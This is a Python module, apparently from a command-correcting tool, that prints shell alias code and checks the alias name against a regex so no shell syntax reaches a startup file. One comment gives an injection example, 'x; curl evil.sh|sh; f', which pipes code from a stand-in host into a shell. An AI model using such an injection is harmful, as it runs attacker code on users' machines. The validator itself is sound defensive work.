import re
import sys
from ..conf import settings
from ..logs import failed, warn
from ..shells import shell

# What may be used as the name of the alias.
#
# The name is pasted into shell code that the user is then told to put in a
# startup file, so `thebleep --alias-loader 'x; curl evil.sh|sh; f'` writes a
# line that runs that at every shell startup. A name is a word: a letter or an
# underscore, then letters, digits, underscores or hyphens. That covers every
# name anyone actually wants -- `bleep`, `fuck`, `oops`, `fix-it` -- and no
# shell syntax at all.
NAME = re.compile(r'^[^\W\d][\w-]*$', re.UNICODE)


def _checked(name):
    """`name`, or nothing at all and a message saying why."""
    if NAME.match(name):
        return name

    failed(u'{!r} cannot be the name of the alias: a name is a letter or an '
           u'underscore followed by letters, digits, underscores or hyphens. '
           u'Anything else would be shell code in your startup file.'
           .format(name))
    sys.exit(1)


def _get_alias(known_args):
    name = _checked(known_args.alias)
    alias = shell.app_alias(name)

    if known_args.enable_experimental_instant_mode:
        from ..utils import which

        if not which('script'):
            warn("Instant mode requires `script` app")
        else:
            return shell.instant_mode_alias(name)

    return alias


def print_alias(known_args):
    settings.init(known_args)
    print(_get_alias(known_args))


def print_alias_loader(known_args):
    """Prints shell code that defines the alias the first time it is used.

    The alias itself is cheap to run but expensive to generate, and generating
    it starts a Python interpreter — at every shell startup, for everyone,
    whether or not they ever correct a command. This defers that to the first
    correction instead, which is the only moment it is needed.

    """
    settings.init(known_args)
    print(shell.app_alias_loader(_checked(known_args.alias_loader)))
